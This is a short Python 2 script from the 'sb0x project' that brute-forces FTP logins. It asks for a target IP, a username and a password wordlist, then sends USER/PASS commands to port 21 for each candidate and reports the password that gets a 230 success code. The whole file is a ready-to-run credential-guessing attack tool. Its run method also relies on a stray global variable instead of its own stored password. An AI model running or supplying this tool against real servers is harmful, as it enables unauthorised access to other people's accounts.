"""
test_ftp.py - ftp brute force
author:levi0x0
Copyright (c) 2013-201x sb0x project

See the file LICENSE
"""

from socket import *
import sys
import threading
import Queue

class test_ftp(threading.Thread):

		def __init__(self,target,user,passwords,):
			self.target = target #ftp server
			self.user = user #username
			self.passwords = passwords #wordlist
			self.port = 21 #port 21 default FTP PORT
			threading.Thread.__init__(self)


		def run(self):
			self.s = socket(AF_INET,SOCK_STREAM) #OPEN SOCKET TCP/IPV4

			self.test = self.s.connect_ex((self.target, self.port)) #connect 

			if self.test == 0:
				pass
			else:
				print "[-] Sorry port 21 not open"
				sys.exit()
			self.data = self.s.recv(1024)
			
			self.s.send('USER '+ self.user +'\r\n') #send user
			self.data = self.s.recv(1024) #recv data
			self.s.send('PASS ' + passw + '\r\n') #send password
			self.data = self.s.recv(3)
			self.s.close()
			return self.data

try:		
	print "--FTP Brute force--"
	target = raw_input("* Target IP:")
	user = raw_input("* User:")
	passwords = raw_input("Password list (Default):") or "wordlist/password.lst"
	passwords= open(passwords, "r").readlines()
	verbose = False
	
	print "[*]FTP brute force Good luck...."
	for passw in passwords:
		passw = passw.replace("\n", "")
		thread = test_ftp(target,user,passw,)
		a = thread.run()
		if a == '230':
			print "\nLogin Found!"
			print "USER:%s" % user
			print "PASS:%s" % passw
			print "Sb0x project (c) 2013\n"
			sys.exit()
		elif verbose:
			print "[-]USER:%s PASS:%s" % (user,passw)
			pass
		else:
			pass

except IOError:
	print "\n[-]No such file or directory: %s" % (passwords)
	sys.exit(1)
